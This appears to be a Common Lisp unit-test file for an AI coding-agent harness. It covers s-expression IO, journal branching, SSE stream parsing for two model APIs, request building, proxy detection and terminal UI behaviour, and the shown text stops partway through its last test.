;;;; unit.lisp — unit tests: sexpr IO, journal tree/fold, schema emission,
;;;; SSE parsing, handoff pass.  Plain harness, no framework dependency.

(defpackage :evo.tests
  (:use :cl :evo.util :evo.journal :evo.provider :evo.kernel)
  (:export #:run-all))

(in-package :evo.tests)

(defvar *pass* 0)
(defvar *fail* 0)

(defmacro check (name form)
  `(handler-case
       (if ,form
           (incf *pass*)
           (progn (incf *fail*) (format t "FAIL ~a: ~s was NIL~%" ,name ',form)))
     (error (e)
       (incf *fail*)
       (format t "FAIL ~a: signaled ~a~%" ,name e))))

(defmacro check-signals (name form)
  `(handler-case (progn ,form
                        (incf *fail*)
                        (format t "FAIL ~a: expected a signal~%" ,name))
     (error () (incf *pass*))))

;;; sexpr IO

(defun roundtrip (form)
  (read-sexpr (with-output-to-string (s) (write-sexpr-line form s))))

(defun test-sexpr-io ()
  (check "roundtrip plist" (equal (roundtrip '(:a 1 :b "x")) '(:a 1 :b "x")))
  (check "roundtrip newline string"
         (equal (roundtrip '(:text "line1
line2")) '(:text "line1
line2")))
  (check "roundtrip t/nil/vector/ratio"
         (equalp (roundtrip '(:a t :b nil :c #(1 "s") :d 1/3))
                 '(:a t :b nil :c #(1 "s") :d 1/3)))
  (check-signals "reject raw symbol" (read-sexpr "(:a foo)"))
  (check-signals "reject read-eval" (read-sexpr "(:a #.(+ 1 2))"))
  (check-signals "write rejects objects"
                 (with-output-to-string (s) (write-sexpr-line (list :a (make-hash-table)) s)))
  ;; Form-based stream reading survives multi-line strings.
  (with-input-from-string (in (format nil "(:a 1)~%(:b \"x~%y\")~%"))
    (check "stream read form 1" (equal (read-sexpr-stream in) '(:a 1)))
    (check "stream read form 2" (equal (read-sexpr-stream in) (list :b (format nil "x~%y"))))
    (check "stream read eof" (eq (read-sexpr-stream in) :eof))))

;;; Journal

(defun test-journal ()
  (let* ((dir (uiop:ensure-directory-pathname
               (format nil "~a/evo-test-~a/" (uiop:getenv "TMPDIR") (gen-id))))
         (journal (progn (ensure-directories-exist dir)
                         (let ((*default-pathname-defaults* dir))
                           (make-session-journal dir)))))
    ;; Write-ahead buffering: nothing on disk before the first assistant message.
    (append-entry journal '(:type :message :message (:role :user :content ((:type :text :text "hi")))))
    (check "no file before assistant" (not (probe-file (journal-path journal))))
    (let ((a (append-entry journal '(:type :message
                                     :message (:role :assistant :stop-reason :stop :model "m"
                                               :usage (:input 1 :output 2 :cache-read 0 :cache-write 0)
                                               :content ((:type :text :text "hello")))))))
      (check "file exists after assistant" (probe-file (journal-path journal)))
      ;; Branch: append a sibling under the user entry.
      (let* ((user-id (pget (aref (journal-entries journal) 0) :id)))
        (append-entry journal '(:type :message
                                :message (:role :assistant :stop-reason :stop :model "m"
                                          :usage (:input 1 :output 2 :cache-read 0 :cache-write 0)
                                          :content ((:type :text :text "branch-2"))))
                      :parent-id user-id)
        (let ((state (fold-state journal)))
          (check "fold follows leaf branch"
                 (equal (pget (first (pget (second (state-messages state)) :content)) :text)
                        "branch-2"))
          (check "fold has 2 messages on path" (= (length (state-messages state)) 2)))
        ;; Move leaf back to the first assistant entry: original branch.
        (let ((state (fold-state journal (pget a :id))))
          (check "fold on old leaf sees branch-1"
                 (equal (pget (first (pget (second (state-messages state)) :content)) :text)
                        "hello"))))
      ;; Reopen from disk: identical fold.
      (let* ((reopened (open-journal (journal-path journal)))
             (state (fold-state reopened)))
        (check "reopen: leaf preserved" (equal (journal-leaf-id reopened)
                                               (journal-leaf-id journal)))
        (check "reopen: fold equal" (= (length (state-messages state)) 2))))
    (append-entry journal '(:type :model-change :model "m2"))
    (append-entry journal '(:type :tools-change :tools #("bash")))
    (let ((state (fold-state journal)))
      (check "model fold" (equal (state-model state) "m2"))
      (check "tools fold" (equal (state-tools state) '("bash"))))))

;;; Schema emission

(defun test-schema ()
  (let* ((schema '(:object
                   (:command :type :string :description "d")
                   (:replace-all :type :boolean :optional t)
                   (:status :type :string :enum ("complete" "blocked"))))
         (json (com.inuoe.jzon:stringify (schema->json-schema schema))))
    (check "schema type object" (search "\"type\":\"object\"" json))
    (check "snake_case key" (search "\"replace_all\"" json))
    (check "required excludes optional"
           (let ((req (gethash "required" (schema->json-schema schema))))
             (and (find "command" req :test #'equal)
                  (find "status" req :test #'equal)
                  (not (find "replace_all" req :test #'equal)))))
    (check "enum emitted" (search "\"enum\":[\"complete\",\"blocked\"]" json))))

;;; SSE parsing

(defparameter *sse-sample*
  (format nil "event: message_start~%data: {\"type\":\"message_start\",\"message\":{\"model\":\"m\",\"usage\":{\"input_tokens\":7}}}~%~%~
event: content_block_start~%data: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"thinking\",\"thinking\":\"\"}}~%~%~
event: content_block_delta~%data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"thinking_delta\",\"thinking\":\"hm\"}}~%~%~
event: content_block_delta~%data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"signature_delta\",\"signature\":\"c2ln\"}}~%~%~
event: content_block_stop~%data: {\"type\":\"content_block_stop\",\"index\":0}~%~%~
event: content_block_start~%data: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"tc1\",\"name\":\"bash\"}}~%~%~
event: content_block_delta~%data: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"comm\"}}~%~%~
event: content_block_delta~%data: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"and\\\": \\\"ls\\\"}\"}}~%~%~
event: content_block_stop~%data: {\"type\":\"content_block_stop\",\"index\":1}~%~%~
event: message_delta~%data: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":42}}~%~%~
event: message_stop~%data: {\"type\":\"message_stop\"}~%~%"))

(defun test-sse ()
  (let ((result (with-input-from-string (in *sse-sample*)
                  (parse-sse-stream in))))
    (check "sse stopped" (pget result :stopped-p))
    (check "sse stop reason" (eq (pget result :stop-reason) :tool-use))
    (check "sse usage" (and (= (pget (pget result :usage) :input) 7)
                            (= (pget (pget result :usage) :output) 42)))
    (let ((blocks (pget result :content)))
      (check "sse thinking block"
             (and (eq (pget (first blocks) :type) :thinking)
                  (equal (pget (first blocks) :thinking) "hm")
                  (equal (pget (first blocks) :signature) "c2ln")))
      (check "sse tool args across chunks"
             (equal (pget (pget (second blocks) :arguments) :command) "ls"))))
  ;; Stream ending without message_stop is detected (retry material).
  (let ((result (with-input-from-string
                    (in (format nil "event: message_start~%data: {\"type\":\"message_start\",\"message\":{}}~%~%"))
                  (parse-sse-stream in))))
    (check "sse truncation detected" (not (pget result :stopped-p)))))

;;; Handoff pass

(defun test-handoff ()
  (let* ((history
           (list '(:role :user :content ((:type :text :text "go")))
                 '(:role :assistant :model "old" :stop-reason :error :error-message "boom"
                   :usage (:input 0 :output 0 :cache-read 0 :cache-write 0) :content nil)
                 '(:role :assistant :model "old" :stop-reason :tool-use
                   :usage (:input 1 :output 1 :cache-read 0 :cache-write 0)
                   :content ((:type :thinking :thinking "th" :signature "s")
                             (:type :tool-call :id "a" :name "bash" :arguments (:command "ls"))))))
         (out (evo.provider::handoff-pass history "new")))
    (check "handoff elides errored turn"
           (= 3 (length out)))          ; user + assistant + synthetic result
    (check "handoff drops cross-model thinking"
           (notany (lambda (b) (eq (pget b :type) :thinking))
                   (pget (second out) :content)))
    (check "handoff synthesizes orphan result"
           (let ((last (third out)))
             (and (eq (pget last :role) :tool-result)
                  (equal (pget last :tool-call-id) "a")
                  (pget last :is-error))))
    ;; Same-model thinking replays verbatim; results present -> no synthesis.
    (let* ((history2 (append history
                             (list '(:role :tool-result :tool-call-id "a" :tool-name "bash"
                                     :is-error nil :content ((:type :text :text "ok"))))))
           (out2 (evo.provider::handoff-pass history2 "old")))
      (check "handoff keeps same-model thinking"
             (find :thinking (pget (second out2) :content)
                   :key (lambda (b) (pget b :type))))
      (check "handoff no spurious synthesis" (= 3 (length out2))))))

;;; OpenAI Responses SSE parsing

(defparameter *oai-sse-sample*
  (format nil "event: response.created~%data: {\"type\":\"response.created\",\"response\":{\"id\":\"resp_1\",\"model\":\"gpt-5.6-luna\"}}~%~%~
event: response.output_item.added~%data: {\"type\":\"response.output_item.added\",\"output_index\":0,\"item\":{\"type\":\"reasoning\",\"id\":\"rs_1\",\"summary\":[]}}~%~%~
event: response.reasoning_summary_text.delta~%data: {\"type\":\"response.reasoning_summary_text.delta\",\"output_index\":0,\"delta\":\"think\"}~%~%~
event: response.output_item.done~%data: {\"type\":\"response.output_item.done\",\"output_index\":0,\"item\":{\"type\":\"reasoning\",\"id\":\"rs_1\",\"summary\":[{\"type\":\"summary_text\",\"text\":\"think\"}],\"encrypted_content\":\"ENC\"}}~%~%~
event: response.output_item.added~%data: {\"type\":\"response.output_item.added\",\"output_index\":1,\"item\":{\"type\":\"message\",\"id\":\"msg_1\",\"role\":\"assistant\",\"content\":[]}}~%~%~
event: response.output_text.delta~%data: {\"type\":\"response.output_text.delta\",\"output_index\":1,\"delta\":\"hel\"}~%~%~
event: response.output_text.delta~%data: {\"type\":\"response.output_text.delta\",\"output_index\":1,\"delta\":\"lo\"}~%~%~
event: response.output_item.done~%data: {\"type\":\"response.output_item.done\",\"output_index\":1,\"item\":{\"type\":\"message\",\"id\":\"msg_1\",\"role\":\"assistant\",\"content\":[{\"type\":\"output_text\",\"text\":\"hello\"}]}}~%~%~
event: response.output_item.added~%data: {\"type\":\"response.output_item.added\",\"output_index\":2,\"item\":{\"type\":\"function_call\",\"id\":\"fc_1\",\"call_id\":\"call_1\",\"name\":\"bash\",\"arguments\":\"\"}}~%~%~
event: response.function_call_arguments.delta~%data: {\"type\":\"response.function_call_arguments.delta\",\"output_index\":2,\"delta\":\"{\\\"comm\"}~%~%~
event: response.function_call_arguments.delta~%data: {\"type\":\"response.function_call_arguments.delta\",\"output_index\":2,\"delta\":\"and\\\": \\\"ls\\\"}\"}~%~%~
event: response.completed~%data: {\"type\":\"response.completed\",\"response\":{\"id\":\"resp_1\",\"model\":\"gpt-5.6-luna\",\"status\":\"completed\",\"usage\":{\"input_tokens\":100,\"input_tokens_details\":{\"cached_tokens\":40},\"output_tokens\":10}}}~%~%"))

(defun test-openai-sse ()
  (let* ((events nil)
         (result (with-input-from-string (in *oai-sse-sample*)
                   (parse-responses-sse-stream
                    in :on-event (lambda (ev) (push ev events))))))
    (check "oai sse stopped" (pget result :stopped-p))
    (check "oai sse stop reason inferred" (eq (pget result :stop-reason) :tool-use))
    (check "oai sse model" (equal (pget result :model) "gpt-5.6-luna"))
    (check "oai sse usage unbundles cached"
           (let ((u (pget result :usage)))
             (and (= (pget u :input) 60) (= (pget u :cache-read) 40)
                  (= (pget u :output) 10))))
    (let ((blocks (pget result :content)))
      (check "oai sse three blocks" (= 3 (length blocks)))
      (check "oai sse thinking summary"
             (and (eq (pget (first blocks) :type) :thinking)
                  (equal (pget (first blocks) :thinking) "think")))
      (check "oai sse reasoning item kept for replay"
             (equal (pget (pget (first blocks) :item) :encrypted-content) "ENC"))
      (check "oai sse text with item id"
             (and (equal (pget (second blocks) :text) "hello")
                  (equal (pget (second blocks) :item-id) "msg_1")))
      (check "oai sse tool call ids"
             (and (equal (pget (third blocks) :id) "call_1")
                  (equal (pget (third blocks) :item-id) "fc_1")))
      (check "oai sse tool args across chunks"
             (equal (pget (pget (third blocks) :arguments) :command) "ls")))
    ;; The stream parser must NOT emit :tool-call-start — arguments are
    ;; still streaming when the block opens.  The kernel emits it from
    ;; run-tool-call, fully parsed, just before execution.
    (check "oai sse leaves tool-call-start to the kernel"
           (not (find :tool-call-start events
                      :key (lambda (e) (pget e :type))))))
  ;; A stream without a terminal response event is truncation (retry material).
  (let ((result (with-input-from-string
                    (in (format nil "event: response.created~%data: {\"type\":\"response.created\",\"response\":{}}~%~%"))
                  (parse-responses-sse-stream in))))
    (check "oai sse truncation detected" (not (pget result :stopped-p))))
  ;; incomplete + max_output_tokens -> :length.
  (let ((result (with-input-from-string
                    (in (format nil "event: response.incomplete~%data: {\"type\":\"response.incomplete\",\"response\":{\"status\":\"incomplete\",\"incomplete_details\":{\"reason\":\"max_output_tokens\"},\"usage\":{\"input_tokens\":5,\"output_tokens\":7}}}~%~%"))
                  (parse-responses-sse-stream in))))
    (check "oai sse incomplete -> length"
           (and (pget result :stopped-p)
                (eq (pget result :stop-reason) :length)))))

;;; OpenAI Responses request building

(defun test-openai-request ()
  (let* ((item '(:type "reasoning" :id "rs_1"
                 :summary #((:type "summary_text" :text "s"))
                 :encrypted-content "ENC"))
         (history
           (list '(:role :user :content ((:type :text :text "go")))
                 (list :role :assistant :model "gpt-5.6-luna" :stop-reason :tool-use
                       :usage '(:input 1 :output 1 :cache-read 0 :cache-write 0)
                       :content (list (list :type :thinking :thinking "s" :item item)
                                      '(:type :text :text "working" :item-id "msg_1")
                                      '(:type :tool-call :id "call_a" :item-id "fc_a"
                                        :name "bash" :arguments (:command "ls"))))
                 '(:role :tool-result :tool-call-id "call_a" :tool-name "bash"
                   :is-error nil :content ((:type :text :text "ok")))))
         (tools (list (list :name "bash" :description "run"
                            :input-schema (schema->json-schema
                                           '(:object (:command :type :string :description "c"))))))
         (raw (evo.provider::build-responses-request-json
               :model (find-model "gpt-5.6-luna") :system "sys" :messages history
               :tools tools :thinking-level :high :cache-key "sess-1"))
         (req (com.inuoe.jzon:parse raw)))
    (flet ((jget (&rest keys) (apply #'evo.provider::jget req keys)))
      (check "oai req store false" (search "\"store\":false" raw))
      (check "oai req instructions" (equal (jget "instructions") "sys"))
      (check "oai req effort" (equal (jget "reasoning" "effort") "high"))
      (check "oai req include encrypted reasoning"
             (find "reasoning.encrypted_content" (jget "include") :test #'equal))
      (check "oai req cache key" (equal (jget "prompt_cache_key") "sess-1"))
      (check "oai req max output" (= (jget "max_output_tokens") 128000))
      (check "oai req flat function tool"
             (let ((tl (aref (jget "tools") 0)))
               (and (equal (evo.provider::jget tl "type") "function")
                    (equal (evo.provider::jget tl "name") "bash")
                    (evo.provider::jget tl "parameters"))))
      (let ((input (jget "input")))
        (check "oai req item order"
               (equal (map 'list (lambda (i) (evo.provider::jget i "type")) input)
                      '("message" "reasoning" "message" "function_call"
                        "function_call_output")))
        (check "oai req reasoning replayed verbatim"
               (and (equal (evo.provider::jget (aref input 1) "id") "rs_1")
                    (equal (evo.provider::jget (aref input 1) "encrypted_content") "ENC")))
        (check "oai req same-model ids kept"
               (and (equal (evo.provider::jget (aref input 2) "id") "msg_1")
                    (equal (evo.provider::jget (aref input 3) "id") "fc_a")))
        (check "oai req function call wire form"
               (and (equal (evo.provider::jget (aref input 3) "call_id") "call_a")
                    (equal (pget (evo.provider::json->sexpr
                                  (com.inuoe.jzon:parse
                                   (evo.provider::jget (aref input 3) "arguments")))
                                 :command)
                           "ls")))
        (check "oai req tool result output"
               (and (equal (evo.provider::jget (aref input 4) "call_id") "call_a")
                    (equal (evo.provider::jget (aref input 4) "output") "ok")))))
    ;; Model switch: handoff drops the reasoning item; item ids don't replay
    ;; (the server validates fc_*<->rs_* same-response pairing).
    (let* ((raw2 (evo.provider::build-responses-request-json
                  :model (find-model "gpt-5.6-sol") :system "sys" :messages history
                  :thinking-level :high))
           (input (evo.provider::jget (com.inuoe.jzon:parse raw2) "input")))
      (check "oai req cross-model drops reasoning"
             (equal (map 'list (lambda (i) (evo.provider::jget i "type")) input)
                    '("message" "message" "function_call" "function_call_output")))
      (check "oai req cross-model drops item ids"
             (and (null (evo.provider::jget (aref input 1) "id"))
                  (null (evo.provider::jget (aref input 2) "id")))))
    ;; Thinking off: explicit effort none, no encrypted-content include.
    (let ((raw3 (evo.provider::build-responses-request-json
                 :model (find-model "gpt-5.6-luna") :messages history
                 :thinking-level :off)))
      (check "oai req thinking off -> effort none"
             (equal (evo.provider::jget (com.inuoe.jzon:parse raw3)
                                        "reasoning" "effort")
                    "none"))
      (check "oai req thinking off -> no include"
             (not (search "reasoning.encrypted_content" raw3))))))

;;; Proxy env detection

(defun test-env-proxy ()
  (let ((saved (mapcar (lambda (v) (cons v (getenv v)))
                       '("HTTPS_PROXY" "https_proxy" "HTTP_PROXY" "http_proxy"
                         "NO_PROXY" "no_proxy")))
        (url "https://api.openai.com/v1/responses"))
    (unwind-protect
         (progn
           (dolist (pair saved) (evo.port:setenv (car pair) ""))
           (check "no proxy env" (null (evo.provider::env-proxy url)))
           (evo.port:setenv "http_proxy" "http://lower:3128")
           (check "lowercase http_proxy detected"
                  (equal (evo.provider::env-proxy url) "http://lower:3128"))
           (evo.port:setenv "https_proxy" "http://lowers:3128")
           (check "lowercase https_proxy preferred"
                  (equal (evo.provider::env-proxy url) "http://lowers:3128"))
           (evo.port:setenv "HTTPS_PROXY" "http://upper:3128")
           (check "uppercase still wins"
                  (equal (evo.provider::env-proxy url) "http://upper:3128"))
           (check "loopback bypasses proxy"
                  (null (evo.provider::env-proxy "http://127.0.0.1:8787/v1/messages")))
           (check "localhost bypasses proxy"
                  (null (evo.provider::env-proxy "http://localhost:8787/v1/messages")))
           (evo.port:setenv "no_proxy" "example.com, openai.com")
           (check "no_proxy suffix match bypasses"
                  (null (evo.provider::env-proxy url)))
           (evo.port:setenv "no_proxy" "example.com")
           (check "no_proxy non-match still proxies"
                  (equal (evo.provider::env-proxy url) "http://upper:3128"))
           (evo.port:setenv "no_proxy" "*")
           (check "no_proxy star bypasses everything"
                  (null (evo.provider::env-proxy url))))
      (dolist (pair saved)
        (evo.port:setenv (car pair) (or (cdr pair) ""))))))

;;; Editor

(defun test-editor ()
  (let ((eb (evo.tui::make-edit-buffer)))
    (evo.tui::eb-insert-text eb "hello")
    (evo.tui::eb-newline eb)
    (evo.tui::eb-insert-text eb "world")
    (check "editor two lines" (equal (evo.tui::eb-text eb)
                                     (format nil "hello~%world")))
    (evo.tui::eb-backspace eb)
    (check "editor backspace" (equal (evo.tui::eb-text eb)
                                     (format nil "hello~%worl")))
    (evo.tui::eb-move eb :home)
    (evo.tui::eb-backspace eb)          ; join lines
    (check "editor join" (equal (evo.tui::eb-text eb) "helloworl")))
  ;; Paste collapse + submit substitution.
  (let ((eb (evo.tui::make-edit-buffer))
        (big (format nil "l1~%l2~%l3~%l4~%l5")))
    (evo.tui::eb-paste eb big)
    (check "paste collapses" (search "[paste #1: 5 lines]" (evo.tui::eb-text eb)))
    (check "submit substitutes" (equal (evo.tui::eb-submit-text eb) big))
    ;; paste-to-expand: same content right after the placeholder
    (evo.tui::eb-paste eb big)
    (check "paste-to-expand inlines" (equal (evo.tui::eb-text eb) big))
    (check "expand clears side buffer" (null (evo.tui::eb-pastes eb))))
  ;; Small pastes insert literally.
  (let ((eb (evo.tui::make-edit-buffer)))
    (evo.tui::eb-paste eb (format nil "a~%b"))
    (check "small paste literal" (equal (evo.tui::eb-text eb) (format nil "a~%b"))))
  ;; Wrapping math.
  (let ((eb (evo.tui::make-edit-buffer)))
    (evo.tui::eb-insert-text eb "0123456789")
    (multiple-value-bind (rows crow ccol) (evo.tui::eb-display-rows eb 4)
      (check "wrap rows" (equal rows '("0123" "4567" "89")))
      (check "wrap cursor" (and (= crow 2) (= ccol 2))))))

;;; Input parser

(defun feed-bytes (bytes &key flush-escape)
  (let ((state (evo.tui::make-input-state)))
    (evo.tui::in-push-bytes state (coerce bytes 'vector))
    (evo.tui::parse-keys state :flush-escape flush-escape)))

(defun test-input ()
  (check "plain chars" (equal (feed-bytes '(104 105)) '((:char #\h) (:char #\i))))
  (check "enter" (equal (feed-bytes '(13)) '(:enter)))
  (check "arrow up" (equal (feed-bytes '(27 91 65)) '(:up)))
  (check "shift-enter csi-u" (equal (feed-bytes '(27 91 49 51 59 50 117)) '(:shift-enter)))
  (check "modifyOtherKeys shift-enter"
         (equal (feed-bytes '(27 91 50 55 59 50 59 49 51 126)) '(:shift-enter)))
  (check "alt-enter fallback" (equal (feed-bytes '(27 13)) '(:newline)))
  (check "ctrl-c" (equal (feed-bytes '(3)) '((:ctrl #\c))))
  (check "bracketed paste"
         (equal (feed-bytes (append '(27 91 50 48 48 126)
                                    (map 'list #'char-code "x")
                                    '(27 91 50 48 49 126)))
                '((:paste "x"))))
  ;; Incomplete sequences wait...
  (let ((state (evo.tui::make-input-state)))
    (evo.tui::in-push-bytes state #(27 91))
    (check "incomplete csi waits" (null (evo.tui::parse-keys state)))
    (evo.tui::in-push-bytes state #(66))
    (check "csi completes later" (equal (evo.tui::parse-keys state) '(:down))))
  ;; Kitty CSI-u: ctrl-modified keys (ctrl+a = "ESC [ 97;5 u").
  (check "kitty ctrl-a" (equal (feed-bytes '(27 91 57 55 59 53 117)) '((:ctrl #\a))))
  (check "kitty ctrl-E uppercase code"
         (equal (feed-bytes '(27 91 54 57 59 53 117)) '((:ctrl #\e))))
  (check "kitty backspace" (equal (feed-bytes '(27 91 49 50 55 117)) '(:backspace)))
  ;; Shift+Tab: legacy back-tab and kitty encodings.
  (check "csi-z shift-tab" (equal (feed-bytes '(27 91 90)) '(:shift-tab)))
  (check "kitty shift-tab" (equal (feed-bytes '(27 91 57 59 50 117)) '(:shift-tab)))
  ;; ...but a lone ESC flushes after quiet ticks.
  (check "lone esc flushes" (equal (feed-bytes '(27) :flush-escape t) '(:escape)))
  ;; UTF-8 across the boundary.
  (let ((state (evo.tui::make-input-state))
        (bytes (flexi-streams:string-to-octets "é" :external-format :utf-8)))
    (evo.tui::in-push-bytes state (subseq bytes 0 1))
    (check "split utf8 waits" (null (evo.tui::parse-keys state)))
    (evo.tui::in-push-bytes state (subseq bytes 1))
    (check "split utf8 completes" (equal (evo.tui::parse-keys state) '((:char #\é))))))

;;; TUI region layout + live context accounting

(defun test-tui-compose ()
  (let ((evo.tui::*cols* 80))
    ;; Layout: permanent activity line, editbox between two rules, status
    ;; line under the editbox.
    (let ((tui (evo.tui::make-tui)))
      (setf (evo.tui::tui-model-label tui) "m"
            (evo.tui::tui-thinking-label tui) "medium"
            (evo.tui::tui-context-tokens tui) 34000
            (evo.tui::tui-context-window tui) 200000)
      (multiple-value-bind (lines crow ccol) (evo.tui::compose-region tui)
        (check "activity rule first" (search "─" (first lines)))
        (check "idle line always present" (search "idle" (second lines)))
        (check "top rule above editbox" (search "─" (third lines)))
        (check "editor row prompt" (search "❯" (fourth lines)))
        (check "bottom rule below editbox" (search "─" (fifth lines)))
        (check "status line under editbox" (search "ctx 34k/200k" (sixth lines)))
        (check "cursor on editor row" (and (= crow 3) (= ccol 2))))
      ;; Activity animation: rotating slash working, pulsing star thinking,
      ;; static idle glyph.
      (check "idle glyph" (search "○ idle" (evo.tui::activity-line tui)))
      (setf (evo.tui::tui-running tui) t)
      (check "working slash frame 0" (search "| working" (evo.tui::activity-line tui)))
      (incf (evo.tui::tui-spinner tui))
      (check "working slash rotates" (search "/ working" (evo.tui::activity-line tui)))
      (setf (evo.tui::tui-thinking-tail tui) "hm")
      (check "thinking pulse frame" (search "✳ thinking · hm" (evo.tui::activity-line tui)))
      (setf (evo.tui::tui-thinking-tail tui) "")
      ;; Activity + todo sections + editbox rules.
      (setf (evo.tui::tui-todos tui) (vector '(:status "pending" :text "x")))
      (let ((lines (evo.tui::compose-region tui)))
        (check "separators for activity/todo/editbox"
               (= 4 (count-if (lambda (l) (search "─" l)) lines)))))
    ;; Live context: message usage re-anchors, tool results grow the estimate.
    (let ((tui (evo.tui::make-tui)))
      (with-output-to-string (fake-tty)
        (let ((evo.tui::*tty-out* fake-tty)
              (evo.tui::*region-height* 0))
          (evo.tui::handle-agent-event
           tui '(:type :message-end :usage (:input 1000 :output 200 :cache-read 0 :cache-write 0)))
          (check "message-end re-anchors ctx" (= 1200 (evo.tui::tui-context-tokens tui)))
          (check "message-end advances goal tokens" (= 1200 (evo.tui::tui-goal-run-tokens tui)))
          (evo.tui::handle-agent-event
           tui '(:type :tool-result :name "bash" :id "t" :is-error nil
                 :content-chars 4000 :content "out"))
          (check "tool-result grows ctx" (= 2200 (evo.tui::tui-context-tokens tui))))))
    ;; Status line stays well-formed with a goal that has no budget.
    (let ((tui (evo.tui::make-tui)))
      (setf (evo.tui::tui-model-label tui) "m"
            (evo.tui::tui-thinking-label tui) "medium"
            (evo.tui::tui-goal tui) '(:goal-id "g-1" :status :active
                                      :tokens-used 5000 :token-budget nil))
      (let ((line (evo.tui::status-line tui)))
        (check "goal shown without budget" (search "goal g-1 (active) 5k" line))
        (check "no budget suffix when nil" (not (search "5k/" line))))
      (setf (evo.tui::tui-goal tui) '(:goal-id "g-1" :status :active
                                      :tokens-used 5000 :token-budget 40000))
      (check "budget suffix when set"
             (search "5k/40k" (evo.tui::status-line tui))))
    ;; Tab completion of a unique /command.
    (let ((tui (evo.tui::make-tui)))
      (evo.tui::eb-insert-text (evo.tui::tui-editor tui) "/expo")
      (evo.tui::complete-command tui)
      (check "unique completion + space"
             (equal (evo.tui::eb-text (evo.tui::tui-editor tui)) "/export "))
      ;; Tab in plain text stays a literal tab.
      (evo.tui::eb-clear (evo.tui::tui-editor tui))
      (evo.tui::eb-insert-text (evo.tui::tui-editor tui) "x")
      (evo.tui::complete-command tui)
      (check "literal tab outside command"
             (equal (evo.tui::eb-text (evo.tui::tui-editor tui))
                    (format nil "x~c" #\Tab))))
    ;; Live completion popup: typing a /command word shows bounded
    ;; suggestions under the editor, alongside the input.
    (let ((tui (evo.tui::make-tui)))
      (evo.tui::eb-insert-text (evo.tui::tui-editor tui) "/t")
      (multiple-value-bind (prefix matches) (evo.tui::completion-context tui)
        (check "popup active on /prefix" (equal prefix "t"))
        (check "popup filters by prefix"
               (and (<= 3 (length matches))
                    (every (lambda (m) (evo.util:string-prefix-p "t" (car m)))
                           matches)))
        ;; help text: dim, in an aligned column
        (let ((rows (evo.tui::completion-rows tui matches)))
          (flet ((desc-col (row marker)
                   (let ((pos (search marker row)))
                     (and pos (evo.tui::visible-length (subseq row 0 pos))))))
            (check "popup help text rendered dim"
                   (search (format nil "~c[2m" #\Escape)
                           (find-if (lambda (r) (search "toggle the todo" r)) rows)))
            (check "popup help text aligned"
                   (equal (desc-col (find-if (lambda (r) (search "off·low" r)) rows)
                                    "off·low")
                          (desc-col (find-if (lambda (r) (search "toggle the todo" r)) rows)
                                    "toggle the todo"))))))
      (let ((lines (evo.tui::compose-region tui)))
        (check "popup rendered alongside input"
               (and (find-if (lambda (l) (search "❯" l)) lines)
                    (find-if (lambda (l) (search "● /thinking" l)) lines)
                    (find-if (lambda (l) (search "  /todo" l)) lines))))
      (evo.tui::edit-down tui)            ; selection moves in the popup...
      (evo.tui::complete-command tui)     ; ...and tab accepts it
      (check "tab accepts highlighted"
             (equal (evo.tui::eb-text (evo.tui::tui-editor tui)) "/todo "))
      ;; enter on a partial command word completes instead of submitting
      (evo.tui::eb-clear (evo.tui::tui-editor tui))
      (evo.tui::eb-insert-text (evo.tui::tui-editor tui) "/mod")
      (evo.tui::submit tui)
      (check "enter completes partial command"
             (equal (evo.tui::eb-text (evo.tui::tui-editor tui)) "/mode "))
      ;; esc hides the popup until the prefix changes
      (evo.tui::eb-clear (evo.tui::tui-editor tui))
      (evo.tui::eb-insert-text (evo.tui::tui-editor tui) "/t")
      (evo.tui::handle-key-edit tui :escape)
      (check "esc hides popup" (null (evo.tui::completion-context tui)))
      (evo.tui::eb-insert-char (evo.tui::tui-editor tui) #\r)
      (check "typing re-shows popup"
             (equal (evo.tui::completion-context tui) "tr")))
    ;; Popup height is bounded with an overflow indicator.
    (let ((tui (evo.tui::make-tui))
          (evo.tui::*rows* 24))
      (evo.tui::eb-insert-text (evo.tui::tui-editor tui) "/")
      (multiple-value-bind (prefix matches) (evo.tui::completion-context tui)
        (check "bare slash lists all commands"
               (and (equal prefix "") (> (length matches) 7)))
        (let ((rows (evo.tui::completion-rows tui matches)))
          (check "popup height bounded"
                 (<= (length rows) (1+ evo.tui::*completion-max-rows*)))
          (check "popup overflow indicator"
                 (search (format nil "1/~d" (length matches))
                         (car (last rows)))))))
    ;; Select boxes: bounded height, aligned ● marker, position counter.
    (let ((tui (evo.tui::make-tui))
          (evo.tui::*rows* 24))
      (evo.tui::enter-select tui "pick:"
                             (loop for i from 1 to 20
                                   collect (cons (format nil "item-~2,'0d" i) i))
                             (lambda (x) x) :index 9)
      (let ((lines (evo.tui::compose-region tui)))
        (check "select height bounded"
               (<= (count-if (lambda (l) (search "item-" l)) lines) 8))
        (check "select position counter"
               (find-if (lambda (l) (search "10/20" l)) lines))
        (let ((active (find-if (lambda (l) (search "●" l)) lines))
              (inactive (remove-if-not
                         (lambda (l) (evo.util:string-prefix-p "  item-" l))
                         lines)))
          (check "select dot marks active row"
                 (and active (search "● item-10" active)))
          ;; both prefixes are two columns: rows align
          (check "select rows aligned"
                 (and inactive
                      (= (evo.tui::visible-length active)
                         (evo.tui::visible-length (first inactive))))))))
    ;; Select items with help text: dim description, aligned column,
    ;; value still delivered on enter.
    (let ((tui (evo.tui::make-tui))
          (evo.tui::*rows* 24)
          (got nil))
      (evo.tui::enter-select tui "m:"
                             (list (list "a" 1 "alpha desc")
                                   (list "bbb" 2 "beta desc"))
                             (lambda (v) (setf got v)))
      (let* ((lines (evo.tui::compose-region tui))
             (r1 (find-if (lambda (l) (search "alpha desc" l)) lines))
             (r2 (find-if (lambda (l) (search "beta desc" l)) lines)))
        (check "select help text rendered dim"
               (and r1 (search (format nil "~c[2m" #\Escape) r1)))
        (check "select help text aligned"
               (and r1 r2
                    (= (evo.tui::visible-length
                        (subseq r1 0 (search "alpha desc" r1)))
                       (evo.tui::visible-length
                        (subseq r2 0 (search "beta desc" r2)))))))
      (evo.tui::handle-key-select tui :enter)
